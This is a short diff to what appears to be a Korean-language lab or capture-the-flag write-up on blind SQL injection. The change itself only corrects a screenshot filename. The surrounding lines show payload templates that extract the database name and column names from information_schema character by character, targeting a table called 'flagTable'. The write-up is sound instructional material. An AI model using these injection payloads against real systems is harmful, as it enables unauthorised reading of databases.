@@ -64,7 +64,7 @@ normalti' or ascii(substr(database(),{i},1))={ascii} and '1'='1
 ' or ascii(substr((select column_name from information_schema.columns where table_name='flagTable' limit {j},1),{i},1))={ascii} and '1'='1
 ```
 
-![blindsql](./screenshots/python_qli1_column.png)
+![blindsql](./screenshots/python_sqli1_column.png)
 
 - 최종 컬럼 추출 결과:
     - **idx**
